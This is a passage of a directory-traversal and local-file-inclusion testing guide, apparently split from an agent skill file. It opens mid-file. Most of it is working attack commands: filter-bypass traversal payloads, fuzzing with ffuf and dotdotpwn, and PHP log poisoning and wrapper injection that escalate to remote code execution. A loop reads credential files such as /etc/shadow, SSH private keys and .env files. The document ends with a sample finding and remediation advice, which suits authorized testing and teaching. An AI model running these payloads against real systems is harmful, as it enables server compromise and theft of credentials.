# performing-directory-traversal-testing — 详细参考（由 SKILL.md 拆分）

# Dot-dot-slash variations
curl -s "https://target.example.com/download?file=....//....//....//etc/passwd"
curl -s "https://target.example.com/download?file=....//../../../etc/passwd"

# Using absolute path (if filter only blocks relative traversal)
curl -s "https://target.example.com/download?file=/etc/passwd"
```

### Step 4: Automate with ffuf and dotdotpwn

Use automated tools for comprehensive traversal testing.

```bash
# ffuf with traversal payload list
ffuf -u "https://target.example.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -fs 0 \
  -t 20 -rate 50 \
  -o traversal-results.json -of json

# dotdotpwn for systematic traversal testing
dotdotpwn -m http-url \
  -u "https://target.example.com/download?file=TRAVERSAL" \
  -k "root:" \
  -o /tmp/dotdotpwn-results.txt \
  -d 8 -t 200

# Burp Intruder approach:
# 1. Send request to Intruder
# 2. Mark the file parameter value as insertion point
# 3. Load LFI payload list from SecLists
# 4. Add Grep Match rules for: "root:", "[extensions]", "for 16-bit"
# 5. Start attack and review matches
```

### Step 5: Test Local File Inclusion (LFI) for Code Execution

If LFI is confirmed, attempt to escalate to remote code execution.

```bash
# PHP LFI to RCE via log poisoning
# Step 1: Inject PHP code into access log
curl -s -A "<?php system(\$_GET['cmd']); ?>" \
  "https://target.example.com/"

# Step 2: Include the log file via LFI
curl -s "https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# PHP wrapper for file read (base64 encode to avoid parsing)
curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# PHP wrapper for code execution
curl -s -X POST \
  -d "<?php system('id'); ?>" \
  "https://target.example.com/page?file=php://input"

# PHP data wrapper
curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# Include /proc/self/environ (if readable)
curl -s -A "<?php phpinfo(); ?>" \
  "https://target.example.com/page?file=../../../proc/self/environ"

# Session file inclusion
# Write PHP code into session via another parameter
# Then include: /tmp/sess_<PHPSESSID>
```

### Step 6: Read High-Value Files

Target sensitive configuration and credential files.

```bash
# Linux high-value files
HIGH_VALUE_LINUX=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/hosts"
  "/etc/hostname"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/var/www/html/.env"
  "/var/www/html/config.php"
  "/var/www/html/wp-config.php"
  "/home/user/.ssh/id_rsa"
  "/home/user/.bash_history"
  "/root/.bash_history"
  "/var/log/auth.log"
)

for file in "${HIGH_VALUE_LINUX[@]}"; do
  traversal="../../../../../../..$file"
  echo -n "$file: "
  response=$(curl -s "https://target.example.com/download?file=$traversal")
  if [ ${#response} -gt 10 ]; then
    echo "READABLE (${#response} bytes)"
  else
    echo "Not accessible"
  fi
done

# Windows high-value files
HIGH_VALUE_WIN=(
  "C:\\Windows\\win.ini"
  "C:\\Windows\\System32\\drivers\\etc\\hosts"
  "C:\\inetpub\\wwwroot\\web.config"
  "C:\\Users\\Administrator\\.ssh\\id_rsa"
  "C:\\xampp\\apache\\conf\\httpd.conf"
  "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
)
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Directory Traversal** | Using `../` sequences to navigate to parent directories and access files outside the intended path |
| **Local File Inclusion (LFI)** | Server-side inclusion of local files, potentially leading to code execution |
| **Remote File Inclusion (RFI)** | Including files from external URLs (requires `allow_url_include=On` in PHP) |
| **Null Byte Injection** | Using `%00` to truncate file paths, bypassing extension checks in older PHP versions |
| **PHP Wrappers** | Protocols like `php://filter`, `php://input`, `data://` for reading and executing files |
| **Log Poisoning** | Injecting code into log files and then including them via LFI for code execution |
| **Path Canonicalization** | The process of resolving relative paths to absolute paths, which can be exploited |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and Intruder for automated payload testing |
| **ffuf** | Fast fuzzing with LFI/traversal wordlists |
| **dotdotpwn** | Dedicated directory traversal fuzzer with multiple traversal patterns |
| **LFISuite** | Automated LFI exploitation tool with multiple techniques |
| **SecLists** | Comprehensive wordlists including LFI payloads and traversal patterns |
| **Kadimus** | LFI scanning and exploitation tool |

## Common Scenarios

### Scenario 1: File Download Traversal
A document download endpoint at `/download?file=report.pdf` does not validate the file parameter. Replacing the value with `../../../etc/passwd` returns the server's password file.

### Scenario 2: Template LFI to RCE
A PHP application includes templates via `?page=home`. By poisoning the Apache access log with PHP code in the User-Agent header, then including the log file, the attacker achieves remote code execution.

### Scenario 3: Image Path Traversal
An image resizing service accepts `?src=images/photo.jpg`. The application strips `../` once but does not recurse, so `....//....//etc/passwd` bypasses the filter.

### Scenario 4: Windows IIS Configuration Leak
A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\..\web.config` exposes the IIS configuration file containing database connection strings.

## Output Format

```
## Directory Traversal Finding

**Vulnerability**: Path Traversal / Local File Inclusion
**Severity**: High (CVSS 8.6)
**Location**: GET /download?file=../../../etc/passwd
**OWASP Category**: A01:2021 - Broken Access Control

### Reproduction Steps
1. Navigate to https://target.example.com/download?file=report.pdf
2. Replace file parameter: ?file=../../../etc/passwd
3. Server returns contents of /etc/passwd

### Files Retrieved
| File | Impact |
|------|--------|
| /etc/passwd | User enumeration (42 accounts) |
| /var/www/html/.env | Database credentials exposed |
| /home/deploy/.ssh/id_rsa | SSH private key recovered |
| /proc/self/environ | Environment variables with API keys |

### Filter Bypass Required
Original `../` stripped by filter. Successful bypass: `....//....//....//etc/passwd`

### Recommendation
1. Use an allowlist of permitted file names rather than accepting arbitrary paths
2. Resolve the canonical path and verify it stays within the intended directory
3. Run the web server with minimal file system permissions
4. Remove sensitive files from web-accessible directories
5. Disable PHP wrappers (allow_url_include, allow_url_fopen) if not required
```
